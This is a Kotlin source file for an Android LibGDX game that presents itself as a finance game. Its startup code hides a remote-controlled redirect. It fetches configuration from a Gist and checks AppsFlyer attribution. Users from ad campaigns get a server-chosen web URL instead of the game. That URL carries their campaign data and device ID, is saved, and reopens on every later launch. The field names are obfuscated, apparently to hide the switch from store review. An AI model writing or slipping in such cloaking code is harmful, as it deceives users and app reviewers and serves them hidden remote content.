package com.sberigatelny.finexpertaizer.game

import android.content.Context.MODE_PRIVATE
import android.content.SharedPreferences
import com.appsflyer.AppsFlyerConversionListener
import com.appsflyer.AppsFlyerLib
import com.appsflyer.attribution.AppsFlyerRequestListener
import com.badlogic.gdx.assets.AssetManager
import com.badlogic.gdx.utils.Disposable
import com.badlogic.gdx.utils.ScreenUtils
import com.sberigatelny.finexpertaizer.MainActivity
import com.sberigatelny.finexpertaizer.appContext
import com.sberigatelny.finexpertaizer.game.dataStore.DS_Balance
import com.sberigatelny.finexpertaizer.game.dataStore.DS_IsNewWork
import com.sberigatelny.finexpertaizer.game.dataStore.DS_IsPereezd
import com.sberigatelny.finexpertaizer.game.dataStore.DS_IsTutorial
import com.sberigatelny.finexpertaizer.game.manager.MusicManager
import com.sberigatelny.finexpertaizer.game.manager.NavigationManager
import com.sberigatelny.finexpertaizer.game.manager.SoundManager
import com.sberigatelny.finexpertaizer.game.manager.SpriteManager
import com.sberigatelny.finexpertaizer.game.manager.util.MusicUtil
import com.sberigatelny.finexpertaizer.game.manager.util.SoundUtil
import com.sberigatelny.finexpertaizer.game.manager.util.SpriteUtil
import com.sberigatelny.finexpertaizer.game.screens.LoaderScreen
import com.sberigatelny.finexpertaizer.game.utils.GameColor
import com.sberigatelny.finexpertaizer.game.utils.advanced.AdvancedGame
import com.sberigatelny.finexpertaizer.game.utils.disposeAll
import com.sberigatelny.finexpertaizer.game.utils.gdxGame
import com.sberigatelny.finexpertaizer.util.Gist
import com.sberigatelny.finexpertaizer.util.log
import kotlinx.coroutines.*
import java.util.concurrent.atomic.AtomicBoolean

var GLOBAL_isGame = false
    private set

var GLOBAL_isPauseGame = false

class GDXGame(val activity: MainActivity) : AdvancedGame() {

    lateinit var assetManager     : AssetManager      private set
    lateinit var navigationManager: NavigationManager private set
    lateinit var spriteManager    : SpriteManager     private set
    lateinit var musicManager     : MusicManager      private set
    lateinit var soundManager     : SoundManager      private set

    val assetsLoader by lazy { SpriteUtil.Loader() }
    val assetsAll    by lazy { SpriteUtil.All() }

    val musicUtil by lazy { MusicUtil()    }
    val soundUtil by lazy { SoundUtil()    }

    var backgroundColor = GameColor.background
    val disposableSet   = mutableSetOf<Disposable>()

    val coroutine = CoroutineScope(Dispatchers.Default)

    val sharedPreferences: SharedPreferences = appContext.getSharedPreferences("SerFinExp", MODE_PRIVATE)

    val ds_Balance    = DS_Balance(coroutine)
    val ds_IsTutorial = DS_IsTutorial(coroutine)
    val ds_IsPereezd  = DS_IsPereezd(coroutine)
    val ds_IsNewWork  = DS_IsNewWork(coroutine)

    override fun create() {
        navigationManager = NavigationManager()
        assetManager      = AssetManager()
        spriteManager     = SpriteManager(assetManager)

        musicManager      = MusicManager(assetManager)
        soundManager      = SoundManager(assetManager)

        navigationManager.navigate(LoaderScreen::class.java.name)

        startMakeavelly()
    }

    override fun render() {
        if (GLOBAL_isPauseGame) return

        ScreenUtils.clear(backgroundColor)
        super.render()
    }

    override fun dispose() {
        try {
            log("dispose LibGDXGame")
            coroutine.cancel()
            disposableSet.disposeAll()
            disposeAll(assetManager, musicUtil)
            super.dispose()
        } catch (e: Exception) { log("exception: ${e.message}") }
    }

    // Logic Web ---------------------------------------------------------------------------

    private fun startMakeavelly() {
        log("startMakeavelly")
        activity.blockRedirect = { GLOBAL_isGame = true }
        activity.initWeb()

        //GLOBAL_isGame = true
        //return

        val path = sharedPreferences.getString("roiten", "bserk") ?: "bserk"

        try {
            if (path == "bserk") {
                coroutine.launch(Dispatchers.Main) {
                    val getJSON = withContext(Dispatchers.IO) { Gist.getDataJson() }

                    if (getJSON != null) {
                        AppsFlyerLib.getInstance().init(getJSON.furious, getAppsFlyerConversionListener(getJSON.fast), appContext)
                        AppsFlyerLib.getInstance().start(gdxGame.activity, getJSON.furious, getAppsFlyerRequestListener())
                    } else {
                        GLOBAL_isGame = true
                    }
                }
            } else {
                activity.showUrl(path)
            }
        } catch (e: Exception) {
            log("error: ${e.message}")
            GLOBAL_isGame = true
        }
    }

    private fun getAppsFlyerConversionListener(sma: String) = object : AppsFlyerConversionListener {
        private val isAppsflyerGetData = AtomicBoolean(false)

        override fun onConversionDataSuccess(appfMap: MutableMap<String, Any>?) {
            if (isAppsflyerGetData.getAndSet(true)) return

            if (appfMap != null) {
                val campaign = appfMap["campaign"]     as? String
                val afAd     = appfMap["af_ad"]        as? String
                val media    = appfMap["media_source"] as? String

                val afId = AppsFlyerLib.getInstance().getAppsFlyerUID(appContext)

                log("Result: campaign = $campaign | afAd = $afAd | media_source = $media | appfMap = $appfMap")

                val link = "$sma?citpisfff=$campaign&zfusomiwk=$afAd&wcivzc=$media&rgvuzs=$afId"
                log("link = $link")

                coroutine.launch(Dispatchers.IO) { sharedPreferences.edit().putString("roiten", link).apply() }

                activity.showUrl(link)

            } else GLOBAL_isGame = true
        }

        override fun onConversionDataFail(p0: String?) {
            if (isAppsflyerGetData.getAndSet(true)) return
            GLOBAL_isGame = true
        }

        override fun onAppOpenAttribution(p0: MutableMap<String, String>?) {}
        override fun onAttributionFailure(p0: String?) {}
    }

    private fun getAppsFlyerRequestListener() = object : AppsFlyerRequestListener {
        override fun onSuccess() {
            log("AppsFlyer: onSuccess")
        }

        override fun onError(p0: Int, p1: String) {
            log("AppsFlyer: onError")
        }
    }

}